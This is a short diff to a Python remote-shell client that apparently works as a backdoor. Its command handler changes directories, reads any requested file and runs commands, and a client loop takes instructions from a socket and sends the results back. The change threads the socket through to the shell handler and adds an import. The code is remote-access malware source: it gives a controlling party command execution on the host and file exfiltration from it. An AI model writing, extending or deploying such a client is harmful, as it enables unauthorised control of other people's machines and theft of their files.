@@ -1,6 +1,7 @@
 #!/usr/bin/env python
 # ---------- LIBRARIES ---------- #
 # Global (System)
+import time
 import socket
 import subprocess
 import os
@@ -32,14 +33,14 @@ class CommandHandler():
         except:
             return 'Error Getting Sysinfo'
 
-    def shell(self, command: str):
+    def shell(self, command: str, conn: socket.socket):
         if command[:3] == 'cd ':
             try:
                 os.chdir(command[3:])
                 return str.encode(os.getcwd())
             except:
                 return str.encode('Error Changing Directory')
-        if command[:9] == 'download ':
+        elif command[:9] == 'download ':
             try:
                 file = open(command[9:], 'rb')
                 return file.read()
@@ -78,7 +79,7 @@ class Client(CommandHandler):
                     print(data)
                     if data.decode() == 'exit':
                         break
-                    result = self.shell(data.decode())
+                    result = self.shell(data.decode(), self.sock)
                     self.sock.send(result)
 
 def main():
